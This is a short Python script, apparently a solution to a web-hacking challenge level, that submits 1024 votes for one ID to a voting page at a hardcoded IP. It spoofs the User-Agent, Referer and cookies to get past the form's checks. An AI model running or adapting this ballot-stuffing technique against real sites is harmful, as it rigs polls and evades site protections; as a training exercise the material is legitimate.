#!/usr/bin/python3
import requests

def vote_4_pedro():
    URL = 'http://158.69.76.135/level2.php'
    payload = {
        'id': 332,
        'holdthedoor':'Submit',
        'key':'0'
    }
    header = {
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
        'Referer':URL
    }
    cookie = {
        'HoldTheDoor': '0',
        'Expires':'0',
        'Max-Age':'0'
    }
    votes = 0
    while votes < 1024:
        r = requests.post(URL, data=payload, headers=header, cookies=cookie)
        print("Voted: {} times".format(votes)) 
        votes += 1

vote_4_pedro()
